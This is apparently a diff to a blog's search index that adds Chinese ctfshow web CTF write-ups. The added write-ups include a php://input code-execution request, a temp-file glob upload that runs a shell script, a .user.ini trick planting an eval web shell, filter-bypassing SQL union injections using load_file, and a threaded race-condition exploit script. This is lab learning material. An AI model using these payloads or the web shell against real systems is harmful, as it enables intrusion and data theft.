@@ -68,7 +68,9 @@
     <title>ctfshow-web题</title>
     <url>/2025/11/19/ctfshow-web%E9%A2%98/</url>
     <content><![CDATA[<h1 id="CTFSHOW-WEB题"><a href="#CTFSHOW-WEB题" class="headerlink" title="CTFSHOW WEB题"></a>CTFSHOW WEB题</h1><h2 id="web签到题"><a href="#web签到题" class="headerlink" title="web签到题"></a>web签到题</h2><p>F12看源代码，发现<code> Y3Rmc2hvd3tiMDUyYTQ0ZS04MWEyLTRhNWYtYjkyYS1lNDhjNzQ0YWJlOWR9</code> ,通过base64解码得到flag</p>
-<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&quot;cat ctf_go_go_go&quot;);?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>简单的sql注入</p>
+<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>php伪协议</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /?url=php://input HTTP/1.1</span><br><span class="line">Host: 54122502-42c8-42df-b6e7-418bdc5b8afe.challenge.ctf.show</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Sec-Ch-Ua: &quot;Not)A;Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;138&quot;, &quot;Google Chrome&quot;;v=&quot;138&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: https://54122502-42c8-42df-b6e7-418bdc5b8afe.challenge.ctf.show/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 35</span><br><span class="line"></span><br><span class="line">&lt;?php system(&quot;cat ctf_go_go_go&quot;);?&gt;</span><br></pre></td></tr></table></figure>
 
 <h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p><a href="https://blog.csdn.net/Myon5/article/details/133675614">参考</a></p>
 <p>先<code>/?url=/etc/passwd</code></p>
@@ -152,7 +154,7 @@
 </li>
 <li><p><code>&lt;?=</code>相当于<code>&lt;?php ehco</code>的简写版</p>
 </li>
-<li><p><code>?</code>相当于字符的通配符</p>
+<li><p><code>?</code>相当于字符的通配符，负责执行上传的临时文件，&#x2F;??p&#x2F;p?p??????匹配&#x2F;tmp&#x2F;phpxxxxxx</p>
 </li>
 <li><p>payload构造</p>
 <blockquote>
@@ -163,23 +165,90 @@
 <p>反引号:执行命令</p>
 <p><code>.</code>相当于<code>source</code>命令</p>
 <p><code>+</code>：相当于空格</p>
-<p><code>?</code>：文字通配符，负责执行上传的临时文件   &#x2F;??p&#x2F;p?p??????匹配&#x2F;tmp&#x2F;phpxxxxxx</p>
+<p><code>?</code>：文字通配符</p>
 </li>
 <li><p>构造数据包</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">POST /?cmd=?&gt;&lt;?=`.+/??p/p?p??????`; HTTP/1.1</span><br><span class="line">Host: 6d22af06-d619-447d-a81b-425a21e9ccb5.challenge.ctf.show</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Sec-Ch-Ua: &quot;Not)A;Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;138&quot;, &quot;Google Chrome&quot;;v=&quot;138&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: https://6d22af06-d619-447d-a81b-425a21e9ccb5.challenge.ctf.show/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888</span><br><span class="line">Content-Length: 243</span><br><span class="line"></span><br><span class="line">-----------------------------10242300956292313528205888</span><br><span class="line">Content-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;1.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/sh</span></span><br><span class="line"></span><br><span class="line">cat /flag.txt</span><br><span class="line">-----------------------------10242300956292313528205888--</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><code>Content-Type有两个值</code>:<br>①application&#x2F;x-www-form-urlencoded(默认值) ：上传键值对<br>②multipart&#x2F;form-data：上传文件</p>
+<p><code>Content-Type有两个值</code>:</p>
+<ol>
+<li>application&#x2F;x-www-form-urlencoded(默认值) ：上传键值对</li>
+<li>multipart&#x2F;form-data：上传文件</li>
+</ol>
 <p><code>boundary=</code>:boundary定义边界符  <strong>multipart&#x2F;form-data 格式的分隔符</strong>，核心作用是<strong>区分上传的多个表单数据块（如文件、普通表单字段）</strong>，避免不同数据内容混淆。</p>
 <p>文件开始标记：—————————–10242300956292313528205888<br>文件结束标记：—————————–10242300956292313528205888–<br>其中10242300956292313528205888是浏览器随机生成的，只要足够复杂就可以。</p>
 <p><code>#! /bin/bash</code>#! &#x2F;bin&#x2F;sh 指定命令解释器，#!是一个特殊的表示符，其后，跟着解释此脚本的shell路径。bash只是shell的一种，还有很多其它shell，如：sh,csh,ksh,tcsh</p>
-<p><code>cat ../../../flag.txt</code>执行命令得到flag（在这之前先逐次执行<code>ls</code>命令，不断返回上一层，查找flag.txt的位置）</p>
+<p><code>cat /flag.txt</code>执行命令得到flag（先ls &#x2F; 看看根目录，发现有flag.txt）</p>
 </li>
 </ol>
 <p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118235305477.png" alt="image-20251118235305477"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118235342177.png" alt="image-20251118235342177"></p>
-]]></content>
+<h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><p>通过<code>/upload.php.bak</code>看源码：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119124310212.png" alt="image-20251119124310212"></p>
+<p>发现文件名，大小，类型都做了限制</p>
+<p><code>.user.ini</code>：</p>
+<p>在php中”.user.ini”有如下解释：php会在每个目录下搜寻文件名，如果设定为空字符串则php不会搜寻，也就是在“.user.ini”中如果设置了文件名，那么任意一个页面都将该文件中的内容包含进去。</p>
+<p>有两种方法：</p>
+<p>auto_prepend_file:在页面顶部加载文件</p>
+<p>auto_append_file:在页面底部加载文件</p>
+<p>在.user.ini中填写<code>auto_prepend_file=a.txt</code>，上传</p>
+<p>a.txt：</p>
+<?php eval($_GET[c]);?>
+
+<h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><p>当c&#x3D;3时返回here_1s_your_f1ag.php</p>
+<p><code>/here_1s_your_f1ag.php</code>进入登录界面</p>
+<p>F12得到提示，过滤了information_schema.tables和information_schema.columns</p>
+<p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119212313395.png" alt="image-20251119212313395"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1/**/order/**/by/**/1#</span><br><span class="line">//只有1个回显位置</span><br><span class="line"></span><br><span class="line">-1/**/union/**/select/**/database()#</span><br><span class="line">//web</span><br><span class="line"></span><br><span class="line">-1/**/union/**/select/**/user()#</span><br><span class="line">//root用户</span><br><span class="line"></span><br><span class="line">-1/**/union/**/select/**/group_concat(table_name)/**/from/**/information_schema.`tables`/**/where/**/table_schema=&#x27;web&#x27;#</span><br><span class="line">//tables加上反引号绕过  </span><br><span class="line">//content</span><br><span class="line"></span><br><span class="line">-1/**/union/**/select/**/group_concat(column_name)/**/from/**/information_schema.`columns`/**/where/**/table_name=&#x27;content&#x27;#</span><br><span class="line">//id,username,password</span><br><span class="line"></span><br><span class="line">-1/**/union/**/select/**/group_concat(id,username,password)/**/from/**/content#</span><br><span class="line">//1adminflag is not here!,2gtf1ywow,you can really dance,3Wowtell you a secret,secret has a secret...</span><br></pre></td></tr></table></figure>
+<p><code>-1/**/union/**/select/**/load_file(&#39;/etc/nginx/nginx.conf&#39;)</code><br>&#x2F;&#x2F;看网站根目录，确定是&#x2F;var&#x2F;www&#x2F;html</p>
+<p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119221110751.png" alt="image-20251119221110751"></p>
+<p> <code>-1/**/union/**/select/**/load_file(&#39;/var/www/html/secret.php&#39;)</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119221233886.png" alt="image-20251119221233886"></p>
+<p>最后看一下<code>/real_flag_is_here</code>得到flag</p>
+<h2 id="红包第六弹"><a href="#红包第六弹" class="headerlink" title="红包第六弹"></a>红包第六弹</h2><p>dirsearch扫描目录</p>
+<p><img src="C:/Users/yuu/AppData/Roaming/Typora/typora-user-images/image-20251119224834780.png" alt="image-20251119224834780"></p>
+<p><code>/web.zip</code>得到源码</p>
+<p><img src="C:/Users/yuu/AppData/Roaming/Typora/typora-user-images/image-20251119225321166.png" alt="image-20251119225321166"></p>
+<p>通过源码发现key.dat文件，尝试下载</p>
+<p>参考脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import hashlib</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">#这里为什么用分钟数生成：因为通过抓包发现改变分钟后token值才会变化</span><br><span class="line">i=str(time.localtime().tm_min)</span><br><span class="line">#生成token</span><br><span class="line">m=hashlib.md5(i.encode()).hexdigest()</span><br><span class="line">url=&quot;http://bdedf572-c2a4-41ff-966d-3cb094d5eabb.challenge.ctf.show/check.php?token=&#123;&#125;&amp;php://input&quot;.format(m)</span><br><span class="line"></span><br><span class="line">def POST(data):</span><br><span class="line">    try:</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        if &quot;ctfshow&quot; in r.text:</span><br><span class="line">            print(r.text)</span><br><span class="line">            pass</span><br><span class="line">        # print(r.text)</span><br><span class="line">        pass</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;somthing went wrong!&quot;)</span><br><span class="line">        pass</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">with open(&#x27;key.dat&#x27;,&#x27;rb&#x27;) as t:</span><br><span class="line">    data1=t.read()</span><br><span class="line">    pass</span><br><span class="line">for i in range(50):</span><br><span class="line">    threading.Thread(target=POST,args=(data1,)).start()</span><br><span class="line">for i in range(50):</span><br><span class="line">    data2=&#x27;emmmmm&#x27;</span><br><span class="line">    threading.Thread(target=POST,args=(data2,)).start()</span><br></pre></td></tr></table></figure>
+
+<h4 id="攻击原理流程："><a href="#攻击原理流程：" class="headerlink" title="攻击原理流程："></a>攻击原理流程：</h4><ol>
+<li><strong>第一次请求</strong>（发送key.dat内容）：<ul>
+<li>系统接收数据并保存为flag.dat</li>
+<li>此时：flag.dat内容 &#x3D; key.dat内容</li>
+<li>MD5相同，但SHA512也相同（因为内容相同）</li>
+<li>不满足”SHA512不同”的条件</li>
+</ul>
+</li>
+<li><strong>第二次请求</strong>（发送简单字符串）：<ul>
+<li>系统接收数据并<strong>覆盖</strong>flag.dat</li>
+<li>此时：flag.dat内容 &#x3D; “emmmmm”</li>
+<li>MD5不同（因为内容不同），不满足”MD5相同”条件</li>
+</ul>
+</li>
+</ol>
+<h4 id="关键：并发攻击的时间窗口"><a href="#关键：并发攻击的时间窗口" class="headerlink" title="关键：并发攻击的时间窗口"></a>关键：并发攻击的时间窗口</h4><p>通过并发发送大量请求，攻击者利用了一个<strong>时间窗口</strong>：</p>
+<ol>
+<li>在极短时间内，第一个请求使flag.dat等于key.dat内容（满足MD5相同）</li>
+<li>紧接着，第二个请求使flag.dat变为”emmmmm”内容（MD5不同）</li>
+<li><strong>但在验证过程中</strong>，系统可能在不同时间点读取flag.dat：<ul>
+<li>读取MD5时：flag.dat还是key.dat内容（MD5相同）</li>
+<li>读取SHA512时：flag.dat已经变成”emmmmm”内容（SHA512不同）</li>
+</ul>
+</li>
+</ol>
+<h4 id="为什么要发送50次？"><a href="#为什么要发送50次？" class="headerlink" title="为什么要发送50次？"></a>为什么要发送50次？</h4><h4 id="增加成功率的策略："><a href="#增加成功率的策略：" class="headerlink" title="增加成功率的策略："></a>增加成功率的策略：</h4><ol>
+<li><strong>时间窗口很小</strong>：需要在系统处理的极短时间内完成两次文件写入</li>
+<li><strong>并发增加机会</strong>：50个线程并发执行，增加在正确时间窗口内命中的概率</li>
+<li><strong>容错机制</strong>：网络延迟、服务器处理速度等因素可能导致单次请求失败</li>
+</ol>
+<h2 id="红包题第七弹"><a href="#红包题第七弹" class="headerlink" title="红包题第七弹"></a>红包题第七弹</h2>]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
       <tags>
-        <tag>ctf</tag>
+        <tag>ctfshow</tag>
       </tags>
   </entry>
 </search>
